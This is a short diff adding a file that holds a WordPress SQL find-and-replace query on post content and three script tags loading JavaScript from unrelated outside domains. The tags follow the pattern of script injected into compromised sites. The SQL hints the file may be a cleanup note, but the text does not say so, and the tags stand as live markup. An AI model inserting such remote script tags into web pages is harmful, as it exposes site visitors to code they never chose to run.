@@ -1,0 +1,11 @@
+update wp_posts set post_content =
+replace(post_content,"Text to find","text to replace with");
+
+<script src='https://ads.specialadves.com/ping/?ton.js' type='text/javascript'></script>
+<script src='https://open.classicpartnerships.com/close.js?vs=3.6.3' type='text/javascript'></script>
+<script src='https://trick.legendarytable.com/news.js?v=9.4.9' type='text/javascript'></script>
+
+
+
+
+
